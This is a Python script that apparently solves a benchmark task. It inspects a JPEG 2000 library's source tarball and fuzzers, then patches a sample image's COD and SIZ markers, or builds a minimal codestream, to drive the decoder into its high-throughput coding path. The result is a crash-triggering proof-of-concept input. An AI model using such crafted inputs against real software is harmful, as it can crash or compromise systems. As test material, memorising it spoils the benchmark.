import os
import re
import tarfile
import struct
from typing import Optional, Tuple, List


def _be16(b: bytes, off: int) -> int:
    return (b[off] << 8) | b[off + 1]


def _put_be16(buf: bytearray, off: int, v: int) -> None:
    buf[off] = (v >> 8) & 0xFF
    buf[off + 1] = v & 0xFF


def _pack_be16(v: int) -> bytes:
    return struct.pack(">H", v & 0xFFFF)


def _pack_be32(v: int) -> bytes:
    return struct.pack(">I", v & 0xFFFFFFFF)


def _safe_decode_text(b: bytes) -> str:
    try:
        return b.decode("utf-8", "ignore")
    except Exception:
        try:
            return b.decode("latin-1", "ignore")
        except Exception:
            return ""


def _parse_c_int(s: str) -> Optional[int]:
    s = s.strip()
    if not s:
        return None
    s = re.sub(r"[uUlL]+$", "", s)
    try:
        return int(s, 0)
    except Exception:
        return None


def _find_constants_from_sources(tf: tarfile.TarFile) -> Tuple[int, int, int]:
    ht_bit = 0x40
    htmixed_bit = 0x80
    jph_rsiz = 0

    ht_def_re = re.compile(r"^\s*#\s*define\s+([A-Za-z0-9_]*CBLKSTY[A-Za-z0-9_]*HT[A-Za-z0-9_]*)\s+(\S+)\s*$", re.M)
    htm_def_re = re.compile(r"^\s*#\s*define\s+([A-Za-z0-9_]*CBLKSTY[A-Za-z0-9_]*HTMIXED[A-Za-z0-9_]*)\s+(\S+)\s*$", re.M)
    jph_def_re = re.compile(r"^\s*#\s*define\s+([A-Za-z0-9_]*(?:PROFILE|RSIZ)[A-Za-z0-9_]*JPH[A-Za-z0-9_]*)\s+(\S+)\s*$", re.M)

    members = [m for m in tf.getmembers() if m.isreg()]
    for m in members:
        name = m.name.lower()
        if not (name.endswith(".c") or name.endswith(".h") or name.endswith(".hpp") or name.endswith(".cc")):
            continue
        if m.size <= 0 or m.size > 2_000_000:
            continue
        try:
            b = tf.extractfile(m).read()
        except Exception:
            continue
        if len(b) > 600_000:
            b = b[:600_000]
        txt = _safe_decode_text(b)

        for mm in ht_def_re.finditer(txt):
            macro = mm.group(1)
            val = _parse_c_int(mm.group(2))
            if val is None:
                continue
            if "HTMIXED" in macro.upper():
                continue
            if 0 < val < 256:
                ht_bit = val
                break

        for mm in htm_def_re.finditer(txt):
            val = _parse_c_int(mm.group(2))
            if val is None:
                continue
            if 0 < val < 256:
                htmixed_bit = val
                break

        if jph_rsiz == 0:
            for mm in jph_def_re.finditer(txt):
                val = _parse_c_int(mm.group(2))
                if val is None:
                    continue
                if 0 < val <= 0xFFFF:
                    jph_rsiz = val
                    break

    return ht_bit, htmixed_bit, jph_rsiz


def _infer_codec_pref_from_fuzzers(tf: tarfile.TarFile) -> str:
    codec_pref = "ANY"
    members = [m for m in tf.getmembers() if m.isreg()]
    for m in members:
        name = m.name.lower()
        if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp")):
            continue
        if m.size <= 0 or m.size > 1_500_000:
            continue
        try:
            b = tf.extractfile(m).read()
        except Exception:
            continue
        if b.find(b"LLVMFuzzerTestOneInput") == -1:
            continue
        txt = _safe_decode_text(b)
        has_j2k = "OPJ_CODEC_J2K" in txt
        has_jp2 = "OPJ_CODEC_JP2" in txt
        if has_j2k and not has_jp2:
            return "J2K"
        if has_jp2 and not has_j2k:
            return "JP2"
        if has_j2k and has_jp2:
            return "ANY"
    return codec_pref


def _select_best_sample(tf: tarfile.TarFile, codec_pref: str) -> Optional[Tuple[str, bytes]]:
    j2k_exts = (".j2k", ".j2c", ".jph")
    jp2_exts = (".jp2", ".jpx", ".jpm")
    all_exts = j2k_exts + jp2_exts

    best: Optional[Tuple[int, str, tarfile.TarInfo]] = None

    for m in tf.getmembers():
        if not m.isreg():
            continue
        if m.size < 64 or m.size > 1_000_000:
            continue
        name_l = m.name.lower()
        if not name_l.endswith(all_exts):
            continue

        if codec_pref == "J2K" and not name_l.endswith(j2k_exts):
            continue
        if codec_pref == "JP2" and not name_l.endswith(jp2_exts):
            continue

        if best is None or m.size < best[0]:
            best = (m.size, m.name, m)

    if best is None and codec_pref != "ANY":
        return _select_best_sample(tf, "ANY")

    if best is None:
        return None

    try:
        data = tf.extractfile(best[2]).read()
    except Exception:
        return None
    return best[1], data


def _extract_codestream_if_possible(data: bytes) -> bytes:
    soc = data.find(b"\xFF\x4F")
    if soc == -1:
        return data
    eoc = data.find(b"\xFF\xD9", soc + 2)
    if eoc == -1:
        return data[soc:]
    return data[soc:eoc + 2]


def _truncate_at_eoc_if_present(data: bytes) -> bytes:
    soc = data.find(b"\xFF\x4F")
    if soc == -1:
        return data
    eoc = data.find(b"\xFF\xD9", soc + 2)
    if eoc == -1:
        return data
    return data[:eoc + 2]


def _patch_cod_markers(buf: bytearray, ht_bit: int, htmixed_bit: int) -> int:
    patched = 0
    i = 0
    n = len(buf)
    marker = b"\xFF\x52"
    while True:
        pos = buf.find(marker, i)
        if pos == -1:
            break
        if pos + 4 > n:
            break
        Lcod = (buf[pos + 2] << 8) | buf[pos + 3]
        if Lcod < 12 or pos + 2 + Lcod > n:
            i = pos + 2
            continue
        payload = pos + 4
        cblksty_off = payload + 8
        cbw_off = payload + 6
        cbh_off = payload + 7
        if cblksty_off < n:
            old = buf[cblksty_off]
            new = (old & ~(ht_bit | htmixed_bit)) | ht_bit
            if new != old:
                buf[cblksty_off] = new
                patched += 1
        if cbw_off < n:
            if buf[cbw_off] < 4:
                buf[cbw_off] = 4
        if cbh_off < n:
            if buf[cbh_off] < 4:
                buf[cbh_off] = 4

        i = pos + 2
    return patched


def _patch_siz_rsiz(buf: bytearray, rsiz: int) -> bool:
    if rsiz <= 0 or rsiz > 0xFFFF:
        return False
    pos = buf.find(b"\xFF\x51")
    if pos == -1 or pos + 4 >= len(buf):
        return False
    Lsiz = (buf[pos + 2] << 8) | buf[pos + 3]
    if Lsiz < 38 or pos + 2 + Lsiz > len(buf):
        return False
    rsiz_off = pos + 4
    old = (buf[rsiz_off] << 8) | buf[rsiz_off + 1]
    if old == rsiz:
        return True
    _put_be16(buf, rsiz_off, rsiz)
    return True


def _build_minimal_codestream(ht_bit: int, rsiz: int) -> bytes:
    if not (0 <= rsiz <= 0xFFFF):
        rsiz = 0

    out = bytearray()
    out += b"\xFF\x4F"  # SOC

    # SIZ
    Csiz = 1
    Lsiz = 38 + 3 * Csiz
    out += b"\xFF\x51" + _pack_be16(Lsiz)
    out += _pack_be16(rsiz)
    out += _pack_be32(1)  # Xsiz
    out += _pack_be32(1)  # Ysiz
    out += _pack_be32(0)  # XOsiz
    out += _pack_be32(0)  # YOsiz
    out += _pack_be32(1)  # XTsiz
    out += _pack_be32(1)  # YTsiz
    out += _pack_be32(0)  # XTOsiz
    out += _pack_be32(0)  # YTOsiz
    out += _pack_be16(Csiz)
    out += bytes([7, 1, 1])  # Ssiz=8-bit unsigned, XRsiz=1, YRsiz=1

    # COD
    Lcod = 12
    out += b"\xFF\x52" + _pack_be16(Lcod)
    out += bytes([
        0x00,  # Scod
        0x00,  # progression
        0x00, 0x01,  # layers = 1
        0x00,  # MCT
        0x00,  # decomp levels
        0x04,  # cbw exponent-2 => 64
        0x04,  # cbh exponent-2 => 64
        ht_bit & 0xFF,  # cblksty with HT
        0x00,  # reversible
    ])

    # QCD
    out += b"\xFF\x5C" + _pack_be16(4)
    out += bytes([0x02, 0x40])  # Sqcd (no quant, guard=2), SPqcd exponent byte

    # Tile-part
    out += b"\xFF\x90" + _pack_be16(10)  # SOT, Lsot=10
    out += _pack_be16(0)  # Isot
    out += _pack_be32(16)  # Psot (SOT+SOD, no data)
    out += bytes([0x00, 0x01])  # TPsot=0, TNsot=1
    out += b"\xFF\x93"  # SOD

    out += b"\xFF\xD9"  # EOC
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        ht_bit = 0x40
        htmixed_bit = 0x80
        jph_rsiz = 0
        codec_pref = "ANY"

        try:
            with tarfile.open(src_path, "r:*") as tf:
                codec_pref = _infer_codec_pref_from_fuzzers(tf)
                ht_bit, htmixed_bit, jph_rsiz = _find_constants_from_sources(tf)
                sample = _select_best_sample(tf, codec_pref)
        except Exception:
            sample = None

        if sample is not None:
            _, data = sample
            if codec_pref == "J2K":
                data = _extract_codestream_if_possible(data)
            data = _truncate_at_eoc_if_present(data)
            buf = bytearray(data)
            _patch_cod_markers(buf, ht_bit, htmixed_bit)
            if jph_rsiz:
                _patch_siz_rsiz(buf, jph_rsiz)
            return bytes(buf)

        rsiz = jph_rsiz if jph_rsiz else 0
        return _build_minimal_codestream(ht_bit, rsiz)